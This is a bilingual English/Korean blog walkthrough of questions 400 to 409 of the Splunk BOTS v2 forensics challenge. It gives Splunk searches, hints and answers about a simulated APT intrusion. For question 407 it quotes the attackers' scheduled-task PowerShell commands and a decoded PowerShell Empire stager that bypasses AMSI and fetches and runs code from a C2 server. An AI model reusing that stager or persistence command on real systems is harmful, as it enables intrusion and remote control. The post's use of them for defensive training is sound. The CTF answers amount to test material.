---
layout: post
current: post
cover:  assets/built/images/bots/v2/bots-v2.jpg
navigation: True
title: splunk-bots-v2 write up(4)
date: '2021-10-04 20:04:36 +0530'
tags: [splunk]
class: post-template
subclass: 'post tag-splunk'
author: wind-flow
---
{% include bots-table-of-contents.html %}

APT Scenarios:

In this hands-on exercise, you assume the persona of Alice Bluebird, the analyst who successfully assisted Wayne Enterprises and was recommended to Grace Hoppy at Frothly to assist them with their recent issues.  
이 실습에서는 Wayne Enterprises를 성공적으로 지원하고 Frothly의 Grace Hoppy에게 최근 문제를 지원하도록 추천된 분석가 Alice Bluebird의 페르소나를 가정합니다.

Hunting Scenarios:

PowerShell: Adversaries will use PowerShell Empire to establish a foothold and carry out attacks.  
PowerShell: 적들은 PowerShell Empire를 사용하여 거점을 구축하고 공격을 수행합니다.  
Exfiltration Over Alternative Protocol - FTP: Data Exfiltration may occur using common network protocols, principally FTP  
Exfiltration Over Alternative Protocol - FTP: 데이터 유출은 주로 FTP와 같은 일반적인 네트워크 프로토콜을 사용하여 발생할 수 있습니다.  
Exfiltration Over Alternative Protocol - DNS: Data Exfiltration may occur using common network protocols, specifically DNS  
Exfiltration Over Alternative Protocol - DNS: 데이터 유출은 일반적인 네트워크 프로토콜, 특히 DNS를 사용하여 발생할 수 있습니다.  
Adversary Infrastructure: The adversary has established multiple components of infrastructure beyond what we have already uncovered.  
Adversary Infrastructure: 적군은 우리가 이미 밝혀낸 것 이상의 기반 시설의 여러 구성 요소를 구축했습니다.  
Spearphishing Attachment: Adversaries will attempt to establish a foothold within Froth.ly using Phishing.  
Spearphishing Attachment: 적들은 피싱을 사용하여 Froth.ly 내에 거점을 구축하려고 시도합니다.  
User Execution: Adversaries will attempt to establish a foothold within Froth.ly by enticing a user to execute an action on a file.  
User Execution: 공격자는 사용자가 파일에 대해 작업을 실행하도록 유인하여 Froth.ly 내에서 거점을 설정하려고 시도합니다.  
Persistence - Create Account: An adversary will look to maintain persistence across an enterprise by creating user accounts.  
Persistence - Create Account: 공격자는 사용자 계정을 생성하여 기업 전체에서 지속성을 유지하려고 합니다.  
Persistence - Scheduled Task: An adversary will look to maintain persistence across reboots by using a task scheduler.  
Persistence - Scheduled Task: 공격자는 작업 스케줄러를 사용하여 재부팅 시 지속성을 유지하려고 합니다.  
Indicator Removal On Host: Clearing of audit / event logs could indicate an adversary attempting to cover their tracks.  
Indicator Removal On Host: 감사/이벤트 로그를 지우면 공격자가 자신의 흔적을 덮으려는 것을 나타낼 수 있습니다.  
Reconaissance: User Agent Strings may provide insight into an adversary that they may not have intended to show.  
Reconaissance: 사용자 에이전트 문자열은 의도하지 않은 적에 대한 통찰력을 제공할 수 있습니다.
OSINT: Identifying publicly available company information and who is accessing it may provide insight into the adversary.  
OSINT: 공개적으로 사용 가능한 회사 정보와 해당 정보에 액세스하는 사람을 식별하면 적에 대한 통찰력을 제공할 수 있습니다.  
Lateral Movement: Adversaries will look to move laterally to other systems using Windows Management Instrumentation (WMI).  
Lateral Movement: 공격자는 WMI(Windows Management Instrumentation)를 사용하여 측면으로 다른 시스템으로 이동합니다.  
Data Staging: Adversaries will stage data prior to exfiltration to make it easier to extract data at a time of their choosing as well as have a central place to place information as it is identified.  
Data Staging: 공격자는 데이터 유출 전에 데이터를 준비하여 원하는 시간에 데이터를 쉽게 추출할 수 있을 뿐만 아니라 식별된 정보를 배치할 중앙 위치를 확보합니다.  


![Scenario 1]({{site.url}}/assets/built/images/bots/v2/b21.jpg)

The data included in this app was generated in August of 2017 by members of Splunk's Security Specialist team - Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve and James Brodsky. They stood up a few lab environments connected to the Internet. Within the environment they had a few Windows endpoints instrumented with the Splunk Universal Forwarder and Splunk Stream. The forwarders were configured with best practices for Windows endpoint monitoring, including a full Microsoft Sysmon deployment and best practices for Windows Event logging. The environment included a Palo Alto Networks next-generation firewall to capture traffic and provide web proxy services, and Suricata to provide network-based IDS. This resulted in the dataset below.  
이 앱에 포함된 데이터는 2017년 8월 Splunk의 보안 전문가 팀(Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve 및 James Brodsky)이 생성한 것입니다. 그들은 인터넷에 연결된 몇 개의 실험 환경을 구축했습니다. 환경 내에는 Splunk Universal Forwarder 및 Splunk Stream으로 계측된 몇 개의 Windows 엔드포인트가 있었습니다. Forwarder는 전체 Microsoft Sysmon 배포 및 Windows 이벤트 로깅을 위한 모범 사례를 포함하여 Windows endpoint 모니터링을 위한 모범 사례로 구성되었습니다. 이 데이터셋은 트래픽을 캡처하고 웹 프록시 서비스를 제공하는 Palo Alto Networks 차세대 방화벽과 네트워크 기반 IDS를 제공하는 Suricata가 포함되었습니다. 그 결과 아래 데이터세트가 생성되었습니다.

![Scenario 2]({{site.url}}/assets/built/images/bots/v2/b22.jpg)

400	A Federal law enforcement agency reports that Taedonggang often spearphishes its victims with zip files that have to be opened with a password. What is the name of the attachment sent to Frothly by a malicious Taedonggang actor?  
연방 법 집행 기관은 대동강이 종종 비밀번호로 열어야 하는 zip 파일로 피해자를 스피어피싱한다고 보고합니다. 대동강이 Frothly에게 보낸 첨부 파일 이름은 무엇입니까?

<details>
  <summary>hint#1</summary>
    Frothly uses the Splunk wiredata product 'Stream' to collect email metadata. Look at the sourcetype stream:smtp<br>
    Frothly는 Splunk wiredata 제품 'Stream'을 사용하여 이메일 메타데이터를 수집합니다. sourcetype stream:smtp을 살펴보세요.
</details>
<details>
  <summary>hint#2</summary>
    The question mentions that Taedonggang sends a 'zip' file. Look in the sourcetype in hint 1 for attachments with a .zip extension.<br>
    질문은 대동강이 'zip' 파일을 보낸다고 언급합니다. .zip 확장자를 가진 첨부 파일에 대해서는 힌트 1의 소스 유형을 확인하십시오.
</details>

메일에 있는 확장자.zip의 첨부파일명을 확인해봅시다. 

```
sourcetype=stream:smtp *.zip*
```

invoice.zip 한가지 결과만 나옵니다.
![]({{site.url}}/assets/built/images/bots/v2/2021-10-27-17-24-28.png)

뒷문제를 풀기위해 필요한 정보를 파악해둡니다.

|_time|	sender|	receiver{}|	attach_filename{}|	attach_content_md5_hash{}|	received_by_name|	src_ip|
|---|---|---|---|---|---|---|
|2017/08/24 03:27:29.837|	Jim Smith <jsmith@urinalysis.com>|	<btun@froth.ly>	      | invoice.zip	| 20e368e2c9c6e91f24eeddd09369c4aa	| MWHPR18CA0034.outlook.office365.com	| 104.47.37.62
|2017/08/24 03:27:14.323|	Jim Smith <jsmith@urinalysis.com>|	<abungstein@froth.ly>	| invoice.zip	| 20e368e2c9c6e91f24eeddd09369c4aa	| CY4PR18CA0071.outlook.office365.com	| 104.47.41.43
|2017/08/24 03:27:33.239|	Jim Smith <jsmith@urinalysis.com>|	<fyodor@froth.ly>	    | invoice.zip	| 20e368e2c9c6e91f24eeddd09369c4aa	| BY1PR18CA0020.outlook.office365.com	| 104.47.38.87
|2017/08/24 03:27:24.557|	Jim Smith <jsmith@urinalysis.com>|	<klagerfield@froth.ly>|	invoice.zip	| 20e368e2c9c6e91f24eeddd09369c4aa	| CY4PR18CA0058.outlook.office365.com	| 104.47.42.76

답 : invoice.zip

401	The Taedonggang APT group encrypts most of their traffic with SSL. What is the "SSL Issuer" that they use for the majority of their traffic? Answer guidance: Copy the field exactly, including spaces.  
대동강 APT 그룹은 대부분의 트래픽을 SSL로 암호화합니다. 대부분의 트래픽에 사용하는 "SSL 발급자"는 무엇입니까? 답변 지침: 공백을 포함하여 필드를 정확하게 복사합니다.

<details>
  <summary>hint#1</summary>
    You might need to get more information before you tackle this question. Have you figured out the IP address of Taedonggang's server?<br>
    이 질문을 다루기 전에 더 많은 정보를 얻어야 할 수도 있습니다. 대동강 서버의 IP 주소를 알아내셨나요?
</details>
<details>
  <summary>hint#2</summary> 
    Frothly currently only collects SSL data with Stream. Look at the sourcetype 'stream:TCP' for more information about SSL data.<br>
    Frothly는 현재 Stream으로 SSL 데이터만 수집합니다. SSL 데이터에 대한 자세한 내용은 소스 유형 'stream:TCP'를 확인하세요.
</details>
<details>
  <summary>hint#3</summary>
    Issuer' is a value found in a TLS/SSL certificate. Try and find SSL/TLS certificates tied to the IP address of Taedonggang's attacking server.<br>
    Issuer'는 TLS/SSL 인증서에 있는 값입니다. 대동강 공격 서버의 IP 주소에 연결된 SSL/TLS 인증서를 찾아보십시오.
</details>
<details>
  <summary>hint#4</summary>
    Look in sourcetype=stream:tcp with the IP address of Taedonggang and the field ssl_issuer.<br>
    대동강의 IP 주소와 ssl_issuer 필드가 있는 sourcetype=stream:tcp를 찾습니다.
</details>

SSL관련 데이터는 stream:tcp에 있을것입니다. 키워드 ssl을 넣고 검색해봅니다.
```
sourcetype=stream:tcp *ssl*
```


402	Threat indicators for a specific file triggered notable events on two distinct workstations. What IP address did both workstations have a connection with?  
특정 파일에 대한 위협 표시기는 두 개의 개별 워크스테이션에서 주목할만한 이벤트를 트리거했습니다. 두 워크스테이션이 연결된 IP 주소는 무엇입니까?

<details>
  <summary>hint#1</summary>
    Check out the Incident Review dashboard.<br>
    Incident Review dashboard를 확인하십시오.
</details>
<details>
  <summary>hint#2</summary>
    Open notable events for more details.<br>
    자세한 내용은 주목할만한 이벤트를 엽니다.
</details>
<details>
  <summary>hint#3</summary>
    Look for two notable events with the exact same title that has a filename in it.<br>
    파일 이름이 있는 정확히 동일한 제목을 가진 두 개의 주목할만한 이벤트를 찾으십시오.
</details>

Incident Review dashboard가 없으므로 해당문제는 풀이하지 않도록하겠습니다

답 : 160.153.91.7

403	Based on the IP address found in question 402, what domain of interest is associated with that IP address?  
문제 402에서 찾은 IP 주소를 기반으로 해당 IP 주소와 연결된 관심 도메인은 무엇입니까?

<details>
  <summary>hint#1</summary>
    Investigations might shed some light on this.<br>
    Investigations이 실마리입니다.
</details>

<details>
  <summary>hint#2</summary>
    Did you know Enterprise Security has the ability to collect notes and screenshots from other analysts including threat intelligence?<br>
    Enterprise Security가 위협 인텔리전스를 비롯한 다른 분석가로부터 메모와 스크린샷을 수집할 수 있다는 사실을 알고 계셨습니까?
</details>
<details>
  <summary>hint#3</summary>
    Find the investigation with the attachment to gain some additional intelligence about the threat.<br>
    첨부 파일이 있는 조사를 찾아 위협에 대한 추가 정보를 얻으십시오.
</details>

402의 답은 **160.153.91.7**입니다.

도메인은 stream:dns에 있을것입니다.

```
sourcetype=stream:dns 160.153.91.7
```

name field의 값을 보면 2가지값이 나옵니다.
![dns name]({{site.url}}/assets/built/images/bots/v2/2021-10-27-22-01-37.png)

해당 도메인에 대한 정보를 [threatcrowd.org](https://www.threatcrowd.org/domain.php?domain=hildegardsfarm.com))에서 검색해봅니다.

![OSINT]({{site.url}}/assets/built/images/bots/v2/2021-10-27-22-03-23.png)

DNS RESOLUTIONS 항목을 보면 우리가 찾았던 IP인 160.153.91.7와 관계있다는 사실을 발견할 수 있습니다.

답 : hildegardsfarm.com

404	What unusual file (for an American company) does winsys32.dll cause to be downloaded into the Frothly environment?  
winsys32.dll이 Frothly 환경으로 다운로드하게 만드는 비정상적인 파일은 무엇입니까?

<details>
  <summary>hint#1</summary>
    The question is asking about the use of a file called winsys32.dll. Look around for this file and pivot off its utilization!<br>
    질문은 winsys32.dll이라는 파일의 사용에 대해 묻고 있습니다. 이 파일을 찾아 활용을 피벗 하십시오!
</details>

<details>
  <summary>hint#2</summary>
    Find how and when the file winsys32.dll is used being used by Taedonggang. You will need to first find winsys32.dll and then pivot to a new sourcetype. Correlate by time and protocol.<br>
    파일 winsys32.dll이 대동강에서 사용되는 방법과 시기를 찾으십시오. 먼저 winsys32.dll을 찾은 다음 새 소스 유형으로 피벗해야 합니다. 시간과 프로토콜을 연관시킵니다.
</details>  

<details>
  <summary>hint#3</summary>
    If you have found the new sourcetype and one of the correct spans of time (there are more than one), look at the filename field. The answer should stare out at you.<br>
    새 소스 유형과 올바른 시간 범위 중 하나(둘 이상 있음)를 찾은 경우 파일 이름 필드를 확인합니다. 대답은 당신을 응시해야합니다.
</details>

```
winsys32.dll
```

![winsys32.dll결과]({{site.url}}/assets/built/images/bots/v2/2021-10-27-22-14-00.png)

ftp로 파일을 옮긴것을 확인했습니다. (이벤트발생시간 17/08/24 4:16:40.000) stream:ftp에서 마저 확인해봅시다.
ftp 로그중, 다운로드받는 이벤트를 확인해보면 될것입니다.

![ftp method]({{site.url}}/assets/built/images/bots/v2/2021-10-27-22-17-07.png)
ftp method중 다운로드받는 method는 **RETR** 입니다.

```
stream:ftp method=RETR
```
결과 중 filename의 필드의 값을 보면 **나는_데이비드를_사랑한다.hwp (이벤트가 발생한 시간은 17/08/24 4:00:16.831)**라는 특이한 이름의 파일이 있습니다.

![ftp filename]({{site.url}}/assets/built/images/bots/v2/2021-10-27-22-19-19.png)
이벤트 발생 시간을 비교해보아 해당 파일이 비정상적인 파일임을 알 수 있습니다.

답 : 나는_데이비드를_사랑한다.hwp

405	What is the first and last name of the poor innocent sap who was implicated in the metadata of the file that executed PowerShell Empire on the first victim's workstation? Answer example: John Smith  
첫 번째 희생자 단말에서 PowerShell Empire를 실행한 파일의 메타데이터에 연루된 희생자의 이름과 성은 무엇입니까? 답변 예: John Smith

<details>
  <summary>hint#1</summary>
    This is an open source intelligence question. You will need to find the file name/hash of the file that first infected Frothly (think of the extracted file from the answer to question 400) and then pivot off to the internet.<br>
    이 문제는 오픈 소스 인텔리전스 질문입니다. Frothly를 처음 감염시킨 파일의 파일 이름/해시를 찾은 다음(문제 400에 대한 답변에서 추출된 파일을 생각하십시오) 인터넷으로 전환해야 합니다.
</details>
<details>
  <summary>hint#2</summary>
    If you have found the file that first infected Frothly with PowerShell Empire take a look at the Incident Review dashboard. You should find the hash and pivot off that hash in open source intelligence sources. Look at the chart in https://www.splunk.com/blog/2017/07/21/work-flow-ing-your-osint.html for a commonly-used sandbox site that takes file hashes.<br>
    Frothly를 PowerShell Empire로 처음 감염시킨 파일을 찾았다면 Incident Review 대시보드를 살펴보십시오. 오픈 소스 인텔리전스 소스에서 해시를 찾고 해당 해시를 피벗해야 합니다. 파일 해시를 사용하는 일반적으로 사용되는 샌드박스 사이트는 https://www.splunk.com/blog/2017/07/21/work-flow-ing-your-osint.html의 차트를 참조하십시오.    
</details>
<details>
  <summary>hint#3</summary>
    Find the answer to question 400. Look in the logs to find the name of document file extracted from the zipped attachment. Search for that filename in the Incident Review 'Search' filter. Take the hash mentioned in the 'comments' field and search Virustotal for that hash.<br>
    400번 문제에 대한 답을 찾으십시오. 로그에서 압축된 첨부 파일에서 추출한 문서 파일의 이름을 찾으십시오. 사건 검토 '검색' 필터에서 해당 파일 이름을 검색합니다. '설명' 필드에 언급된 해시를 가져와서 Virustotal에서 해당 해시를 검색합니다.    
</details>

추후 풀이 예정

406	What is the average Shannon entropy score of the subdomain containing UDP-exfiltrated data? Answer guidance: Cut off, not rounded, to the first decimal place. Answer examples: 3.2 or 223234.9  
UDP 추출 데이터가 포함된 하위 도메인의 평균 Shannon 엔트로피 점수는 얼마입니까? 답변 안내: 반올림하지 않고 소수점 첫째 자리까지 자릅니다. 답변 예: 3.2 또는 223234.9

<details>
  <summary>hint#1</summary>
    First you will need to find the domain associated with the exfiltrated data. Look at the Stream metadata for a UDP protocol often used to exfiltrate data.<br>
    먼저 추출된 데이터와 연결된 도메인을 찾아야 합니다. 데이터를 추출하는 데 자주 사용되는 UDP 프로토콜에 대한 스트림 메타데이터를 살펴보세요.
</details>
<details>
  <summary>hint#2</summary>
    Review the stream:dns sourcetype and find the IP address that has a high number of queries but is not a normal/legitimate target for DNS queries (IE not RFC1918 or Open DNS server). Look at the domain in the queries to that IP address. Pivot off of that to calculate shannon entropy.<br>
    stream:dns sourcetype을 검토하고 쿼리 수가 많지만 DNS 쿼리에 대한 정상/적법한 대상이 아닌 IP 주소를 찾으십시오(IE가 RFC1918 또는 Open DNS 서버가 아님). 해당 IP 주소에 대한 쿼리에서 도메인을 확인합니다. 섀넌 엔트로피를 계산하기 위해 피벗하십시오.    
</details>
<details>
  <summary>hint#3</summary>
    If you have never calculated Shannon Entropy, look at the documents for the tool 'URL TOOLBOX' or recent entries in https://www.splunk.com/blog/2017/07/06/hunting-with-splunk-the-basics.html. This will teach you how to calculate Shannon entropy. Also review https://www.splunk.com/pdfs/events/govsummit/hunting_the_known_unknowns_with_DNS.pdf where you can learn how to detect DNS exfiltration<br>
    Shannon Entropy를 계산한 적이 없다면 https://www.splunk.com/blog/2017/07/06/hunting-with-splunk-the-basics에서 도구 'URL TOOLBOX' 또는 최근 항목에 대한 문서를 살펴보십시오. .html. 이것은 섀넌 엔트로피를 계산하는 방법을 알려줄 것입니다. DNS 유출을 감지하는 방법을 배울 수 있는 https://www.splunk.com/pdfs/events/govsummit/hunting_the_known_unknowns_with_DNS.pdf 검토하십시오.
</details>

 
```
sourcetype=stream:dns dest_port=53 
| stats count by dest_ip 
| sort -count
```

|dest_ip|count|
|---|---|
|8.8.8.8|81603|
|10.0.1.100|44676|
|172.31.0.2|34004|
|4.4.4.4|7479|
|208.109.255.42|444|
|216.69.185.42|406|
|192.52.178.30|30|
|192.175.48.42|26|
|192.48.79.30|14|
|193.221.113.53|10|
|216.239.34.10|10|
|157.55.133.11|8|

외부망에서 요청한 건은 아래와 같습니다.
208.109.255.42
216.69.185.42

```
index=botsv2 sourcetype=stream:dns (dest_ip=216.69.185.42 OR dest_ip=208.109.255.42) query=* 
| rex field=query "(?<subdomain>\w+).hildegardsfarm.com"
| `ut_shannon(subdomain)`
| stats avg(ut_shannon) by dest_ip
```


|dest_ip|avg(ut_shannon)|
|---|---|
|208.109.255.42|3.616738283047444|
|216.69.185.42|3.633958469641545|

각 값을 두번째자리에서 반올림하면 3.6입니다.

답 : 3.6

407	To maintain persistence in the Frothly network, Taedonggang APT configured several Scheduled Tasks to beacon back to their C2 server. What single webpage is most contacted by these Scheduled Tasks? Answer guidance: Remove the path and type a single value with an extension. Answer example: index.php or images.html  
Frothly 네트워크의 지속성을 유지하기 위해 Daedonggang APT는 C2 서버에 다시 신호를 보내도록 여러 예약된 작업을 구성했습니다. 이러한 예약된 작업에서 가장 많이 연락하는 단일 웹 페이지는 무엇입니까? 답변 안내: 경로를 제거하고 확장자가 있는 단일 값을 입력합니다. 답변 예: index.php 또는 images.html

<details>
  <summary>hint#1</summary>
    Review the question for keywords and search against the hosts in the network.<br>
    키워드에 대한 질문을 검토하고 네트워크의 호스트에 대해 검색하십시오.
</details>

<details>
  <summary>hint#2</summary>
    Look in the sysmon logs for workstations: XmlWinEventLog:Microsoft-Windows-Sysmon/Operational if you haven't figured out where to start!<br>
    어디서부터 시작해야 할지 모르겠다면 워크스테이션용 sysmon 로그를 살펴보세요. XmlWinEventLog:Microsoft-Windows-Sysmon/Operational!
</details>

<details>
  <summary>hint#3</summary>
    Once you find the event for scheduled tasks, you will need to pivot to the sourcetype=WinRegistry. In that sourcetype, look for where the scheduled task receives its destination information. You will need to decode it!<br>
    예약된 작업에 대한 이벤트를 찾으면 sourcetype=WinRegistry로 피벗해야 합니다. 해당 소스 유형에서 예약된 작업이 대상 정보를 수신하는 위치를 찾습니다. 디코딩해야 합니다!
</details>

[schtasks.exe](https://docs.microsoft.com/ko-kr/windows-server/administration/windows-commands/schtasks)는 예약작업을 수행하는 작업스케줄러 명령어입니다. 해당 프로그램을 키워드로 sysmon에서 검색해봅시다.  

```
sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" schtasks.exe CommandLine=*
| table  _time host CommandLine
```

결과 중 network debug관련 이벤트가 보입니다. 예약작업관련 데이터는 winregistry

|_time|host|CommandLine|
|---|---|---|
|2017/08/24 03:45:03|	wrk-btun|	"C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:26 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""|
|2017/08/24 04:04:26|	wrk-klagerf|	"C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:39 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""|
|2017/08/24 04:12:36|venus|	"C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:51 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""|

```
sourcetype=WinRegistry \\Software\\Microsoft\\Network
| stats count by data
```
결과가 총 네개 나옵니다. data필드를 base64로 decode하면

```
[REF].ASSeMBlY.GEtTypE('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GeTFIeLD('amsiInitFailed','NonPublic,Static').SETVAlUe($nUll,$tRue)};[System.NET.SeRviCEPoIntMANAGEr]::EXPect100ConTiNue=0;$Wc=New-ObJECT SYSTeM.NET.WeBClIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HeADeRS.ADd('User-Agent',$u);$wc.PRoxY=[SYStem.NET.WEBRequESt]::DEFaUlTWeBPrOxY;$Wc.PrOXy.CRedEntialS = [SYsTEM.NET.CRedeNtiALCachE]::DeFAuLTNEtWorkCreDeNtials;$K=[SYsTem.TeXT.EncODIng]::ASCII.GETBytes('389288edd78e8ea2f54946d3209b16b8');$R={$D,$K=$ArGS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COunt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxOR$S[($S[$I]+$S[$H])%256]}};$wc.HeaDERs.AdD("Cookie","session=wInU2UbWvd/SdOjjVta0BHaZHjI=");$ser='https://45.77.65.211:443';$t='/login/process.php';$DaTA=$WC.DowNloAdDATA($sEr+$T);$iv=$DaTA[0..3];$dAta=$data[4..$datA.lenGTH];-jOiN[ChAr[]](& $R $dATA ($IV+$K))|IEX
```

이런식으로 나옵니다. 나머지 세개도 base64로 decode해보면

/news.php - 1개
/admin/get.php - 1개
/login/process.php - 2개
가 나옵니다.

그러므로, process.php를 가장 자주 요청합니다.

 답 : process.php

408	The APT group Taedonggang is always building more infrastructure to attack future victims. Provide the IPV4 IP address of a Taedonggang controlled server that has a completely different first octet to other Taedonggang controlled infrastructure. Answer guidance: 4.4.4.4 has a different first octet than 8.4.4.4  
APT 그룹 대동강은 미래의 희생자를 공격하기 위해 항상 더 많은 인프라를 구축하고 있습니다. 다른 대동강 제어 인프라와 완전히 다른 첫 번째 옥텟을 갖는 대동강 제어 서버의 IPV4 IP 주소를 제공하십시오. 답변 지침: 4.4.4.4는 8.4.4.4와 첫 번째 옥텟이 다릅니다.

<details>
  <summary>hint#1</summary>
    Look through your notes of this incident, if you have any. Specifically look at the IP addresses used by Taedonggang. You will need to take information from the Taedonggang infrastructure seen attacking Frothy and pivot to open source intelligence.<br>
    이 사건에 대한 메모가 있으면 살펴보십시오. 특히 대동강이 사용하는 IP 주소를 살펴보십시오. Frothy를 공격하는 대동강 인프라에서 정보를 가져와 오픈 소스 인텔리전스로 전환해야 합니다.
</details>

<details>
  <summary>hint#2</summary> 
    Specifically look at the C2 IP address used by Taedonggang to control their PowerShell Empire agents. Remember that less is more! Sometimes the absence of data helps you find things.<br>
    특히 Daedonggang이 PowerShell Empire 에이전트를 제어하는 ​​데 사용하는 C2 IP 주소를 살펴보세요. 적을수록 좋다는 사실을 기억하세요! 때때로 데이터가 없으면 물건을 찾는 데 도움이 됩니다.
</details>

<details>
  <summary>hint#3</summary>
    Look at the SSL certificates. Think about fields that you can pivot on in open source intelligence.<br>
    SSL 인증서를 살펴보십시오. 오픈 소스 인텔리전스를 중심으로 할 수 있는 분야에 대해 생각해 보십시오.
</details>

<details>
  <summary>hint#4</summary>
    Taking information from hint number 3. Pivot off of different fields in an open source intelligence website that catalogs SSL certificates until you find the server! Review https://www.splunk.com/blog/2017/07/21/work-flow-ing-your-osint if you need help finding OSINT websites
    힌트#3에서 정보를 얻습니다. 서버를 찾을 때까지 SSL 인증서를 카탈로그화하는 오픈 소스 인텔리전스 웹 사이트에서 다양한 필드를 선택하십시오! OSINT 웹 사이트를 찾는 데 도움이 필요한 경우 https://www.splunk.com/blog/2017/07/21/work-flow-ing-your-osint를 검토하십시오.
</details>

407번 문제에서 45.77.65.211를 통신하는것을 발견했습니다.

IP관련 정보는 stream:tcp에서 찾아봅시다.

```
sourcetype=stream:tcp 45.77.65.211
```
ssl_cert_hash_256의 값을 찾을 수 있습니다.  

**1ACB3A5AAA46FC13F788A448716F841168F82227**
해당 값을 [인증서 OSINT 사이트](https://search.censys.io/)에서 검색해봅시다.

답 : 

409	The Taedonggang group had several issues exfiltrating data. Determine how many bytes were successfully transferred in their final, mostly successful attempt to exfiltrate files via a method using TCP, using only the data available in Splunk logs. Use 1024 for byte conversion.  
대동강 그룹은 데이터를 빼내는 데 몇 가지 이슈가 있었습니다. Splunk 로그에서 사용할 수 있는 데이터만 사용하여 TCP를 사용하는 방법을 통해 파일을 추출하려는 대부분의 성공적인 최종 시도에서 성공적으로 전송된 바이트 수를 확인합니다. 바이트 변환에 1024를 사용합니다.

<details>
  <summary>hint#1</summary>
    The data for this question is located in sourcetype=stream:ftp<br>
    이 문제에 대한 데이터는 sourcetype=stream:ftp에 있습니다.
</details>

<details>
  <summary>hint#2</summary>
    Review the sourcetype referenced in hint one on August 25, 2017. You'll notice four distinct bursts of activity. Look at the largest one for the information you require. Find the start message in the logs (there is no stop). A key word is 'successful'.<br>
    2017년 8월 25일의 힌트 1에서 참조된 소스 유형을 검토하세요. 네 가지 뚜렷한 활동 버스트를 확인할 수 있습니다. 필요한 정보는 가장 큰 것을 보십시오. 로그에서 시작 메시지를 찾습니다(중지 없음). 키워드는 '성공'이다.
</details>

<details>
  <summary>hint#3</summary>
    The data is NOT in a Splunk field of 'bytes'. You will need to write a regex against the data to find the answer. Review https://www.splunk.com/blog/2017/08/30/rex-groks-gibberish.html if you need help writing a regex!<br>
    데이터가 '바이트'의 Splunk 필드에 없습니다. 답을 찾으려면 데이터에 대해 정규식을 작성해야 합니다. 정규식 작성에 도움이 필요하면 https://www.splunk.com/blog/2017/08/30/rex-groks-gibberish.html을 검토하십시오!
</details>

<details>
  <summary>hint#4</summary>
    The information in the field you are parsing will have something like 'Megabytes per second' and 'Kilobytes' per second. Make sure you do your calculations with those terms in mind.<br>
    구문 분석하는 필드의 정보는 '초당 메가바이트' 및 '초당 킬로바이트'와 같은 값을 갖습니다. 이러한 용어를 염두에 두고 계산을 하십시오.
</details>

추후 풀이 예정